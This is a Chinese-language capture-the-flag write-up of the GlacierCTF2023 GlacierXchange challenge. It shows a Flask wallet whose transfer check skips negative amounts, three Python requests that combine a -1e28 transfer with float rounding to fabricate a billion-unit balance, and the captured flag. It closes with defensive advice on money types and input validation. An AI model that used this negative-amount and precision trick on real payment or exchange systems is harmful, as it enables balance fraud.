# GlacierCTF2023 - GlacierXchange

## 题目简述

Flask 交易所钱包初始只有 `cashout = 1000`。加入 Glacier Club 要求 cashout 至少十亿，且其余六个币种余额都精确等于 `0.0`。交易 API 把 JSON 的 `balance` 转成 Python float，但没有要求金额为正。

## 解题过程

转账逻辑是：

```python
if balances[source] >= amount:
    balances[source] -= amount
    balances[dest] += amount
```

从余额为零的 `ascoin` 向 `glaciercoin` 转账 `-1e28`，比较 `0 >= -1e28` 成立，结果变为：

```text
ascoin       =  1e28
glaciercoin  = -1e28
```

再从 ascoin 向 cashout 转十亿。$10^{28}$ 附近的 IEEE-754 double 相邻可表示数间距远大于 $10^9$，所以 `1e28 - 1e9` 仍舍入为 `1e28`，但 cashout 会实际增加十亿。最后转账正的 `1e28` 从 ascoin 到 glaciercoin，两者都回到 `0.0`：

```python
session.post("/api/wallet/transaction", json={
    "sourceCoin": "ascoin",
    "targetCoin": "glaciercoin",
    "balance": "-1e28",
})
session.post("/api/wallet/transaction", json={
    "sourceCoin": "ascoin",
    "targetCoin": "cashout",
    "balance": "1000000000",
})
session.post("/api/wallet/transaction", json={
    "sourceCoin": "ascoin",
    "targetCoin": "glaciercoin",
    "balance": "1e28",
})
```

此时 cashout 超过十亿，其余余额均为零，调用 `/api/wallet/join_glacier_club` 得到：

```text
gctf{PyTh0N_CaN_hAv3_Fl0At_0v3rFl0ws_2}
```

赛后还出现过 `NaN`/无穷值非预期解；预期路线已经说明负数校验和大数浮点精度如何共同制造余额。

## 方法总结

财务状态不应使用二进制浮点，也不能只检查“余额大于金额”而忽略金额符号与有限性。应使用整数最小单位或定点十进制，并统一拒绝负数、NaN、Infinity 和溢出范围外输入。
